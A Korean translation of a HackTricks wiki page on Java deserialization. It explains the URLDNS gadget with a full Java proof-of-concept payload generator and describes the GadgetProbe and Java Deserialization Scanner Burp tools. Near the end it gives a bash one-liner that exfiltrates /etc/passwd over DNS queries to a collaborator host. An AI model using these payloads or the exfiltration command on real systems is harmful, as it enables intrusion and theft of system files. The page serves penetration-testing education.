# Java DNS 직렬화, GadgetProbe 및 Java 직렬화 스캐너

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team 전문가)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 트릭을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 제출하세요.

</details>

## 직렬화된 DNS 요청

`java.net.URL` 클래스는 `Serializable`을 구현하므로 이 클래스는 직렬화될 수 있다.
```java
public final class URL implements java.io.Serializable {
```
이 클래스는 **흥미로운 동작**을 가지고 있습니다. 문서에서는 "**두 호스트가 동일한 IP 주소로 해석될 수 있다면 호스트 이름이 동일하게 간주됩니다**"라고 설명하고 있습니다.\
그러면 URL 객체가 **`equals`** 또는 **`hashCode`** 함수 중 **어떤 것을 호출하더라도** IP 주소를 가져오기 위해 **DNS 요청이 전송**됩니다.

**URL** 객체에서 **`hashCode`** 함수를 **호출하는 것**은 매우 쉽습니다. 이 객체를 역직렬화될 `HashMap` 안에 삽입하면 됩니다. 이것은 `HashMap`의 **`readObject`** 함수의 **끝에서** 이 코드가 실행되기 때문입니다:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
그것은 `HashMap` 내의 모든 값과 함께 `putVal`를 **실행**할 것입니다. 그러나 더 중요한 것은 모든 값과 함께 `hash`를 호출하는 것입니다. 이것이 `hash` 함수의 코드입니다:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
당신이 관찰할 수 있듯이 **`HashMap`**을 **역직렬화**할 때 `hash` 함수는 **각 객체와 함께 실행됩니다**. **`hash`** 실행 중에는 객체의 `.hashCode()`가 실행됩니다. 따라서 **`HashMap`**을 **역직렬화**하면 **URL 객체**가 `.hashCode()`를 **실행**할 것입니다.

이제 `URLObject.hashCode()` 코드를 살펴보겠습니다:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
위에서 볼 수 있듯이 `URLObject`가 `.hashCode()`를 실행하면 `hashCode(this)`가 호출됩니다. 계속 진행하면 이 함수의 코드를 볼 수 있습니다:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
`getHostAddress`가 도메인에 대해 실행되어 **DNS 쿼리를 시작**합니다.

따라서 이 클래스는 **악용**될 수 있어 **DNS 쿼리를 시작**하여 **직렬화**가 가능하다는 것을 **보여주는** 데 사용하거나 **정보를 유출**할 수 있습니다 (명령 실행의 출력을 하위 도메인으로 추가할 수 있습니다).

### URLDNS 페이로드 코드 예시

[여기서 URDNS 페이로드 코드를 찾을 수 있습니다](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java). 그러나 코드를 이해하기 쉽게 만들기 위해 ysoserial의 것을 기반으로 한 PoC를 만들었습니다:
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### 추가 정보

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* 원래 아이디어에서 commons collections 페이로드가 DNS 쿼리를 수행하도록 변경되었으며, 이는 제안된 방법보다 신뢰성이 낮았지만 다음 게시물입니다: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

[Burp Suite App Store (Extender)](https://github.com/BishopFox/GadgetProbe)에서 **GadgetProbe**를 다운로드할 수 있습니다.

**GadgetProbe**는 서버의 **Java 클래스**에 일부 **Java 클래스가 존재하는지** 확인하여 해당 서버가 알려진 취약점에 **취약한지** 알 수 있습니다.

### 작동 방식

**GadgetProbe**는 이전 섹션의 **DNS 페이로드**를 사용하지만 DNS 쿼리를 실행하기 **전에** 임의의 클래스를 **역직렬화**하려고 합니다. **임의의 클래스가 존재**하는 경우 **DNS 쿼리**가 **전송**되고 GadgetProbe는 이 클래스가 존재한다는 것을 알립니다. **DNS** 요청이 **전송되지 않으면**, 이는 **임의의 클래스가 성공적으로 역직렬화되지 않았다는 것**을 의미하므로 해당 클래스가 존재하지 않거나 **직렬화/악용**할 수 없는 것입니다.

깃허브 내부에는 [**GadgetProbe에 테스트할 Java 클래스 목록**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)이 있습니다.

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1).gif>)

### 추가 정보

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

이 스캐너는 Burp App Store (Extender)에서 **다운로드**할 수 있습니다.\
**확장 프로그램**에는 **수동** 및 **능동적인 기능**이 있습니다.

### 수동

기본적으로 **Java 직렬화 마법 바이트**를 찾기 위해 **보낸 모든 요청 및 응답을 수동으로 확인**하고 발견된 경우 취약성 경고를 표시합니다:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (765).png>)

### 능동적

**수동 테스트**

요청을 선택하고 마우스 오른쪽 단추를 클릭하여 `Send request to DS - Manual Testing`를 선택할 수 있습니다.\
그런 다음 _Deserialization Scanner Tab_ --> _Manual testing tab_에서 **삽입 지점**을 선택할 수 있습니다. 그리고 **테스트를 실행**할 수 있습니다 (사용된 인코딩에 따라 적절한 공격을 선택하십시오).

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

이것이 "수동 테스트"라고 불리지만, 꽤 **자동화**되어 있습니다. 웹 서버에 있는 라이브러리를 확인하고 취약한 라이브러리를 강조하기 위해 **Java Sleeps**, **CPU** 소비를 통한 **sleeps**, 또는 이전에 언급된 **DNS**를 사용하여 **어떤 ysoserial 페이로드에 취약한지** 자동으로 확인합니다.

**악용**

취약한 라이브러리를 식별하면 요청을 _Exploiting Tab_로 보낼 수 있습니다.\
이 탭에서 다시 **삽입 지점**을 선택하고, **페이로드를 생성하려는 취약한 라이브러리**와 **명령**을 작성한 다음 적절한 **공격** 버튼을 누르기만 하면 됩니다.

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/4.png)

### Java Deserialization DNS Exfil 정보

페이로드가 다음과 같은 것을 실행하도록 만드세요:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### 더 많은 정보

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>
